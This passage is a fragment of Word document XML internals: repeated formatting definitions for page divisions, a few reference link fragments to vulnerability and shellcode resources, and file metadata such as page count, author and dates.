        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1428768225">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1445879795">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1589920226">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1634167213">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1706060047">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1877739830">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1943563035">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2007318383">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2140606424">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="214481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trellix.com/blogs/research/smbghost-analysis-of-cve-2020-0796/"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www.techtarget.com/searchsecurity/answer/What-is-the-relationship-between-shellcode-and-exploit-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efuse.ca/online-x86-assembler.ht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CptGibbon/CVE-2021-315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544DD-2D09-49A0-87CC-2E357586A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675</TotalTime>
  <Pages>49</Pages>
  <Words>8407</Words>
  <Characters>47925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Ngọc Anh Trần</cp:lastModifiedBy>
  <cp:revision>10</cp:revision>
  <cp:lastPrinted>2019-05-16T15:57:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-11-30T11:08:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-12-16T14:42:00Z</dcterms:modified>
</cp:coreProperties>
</file>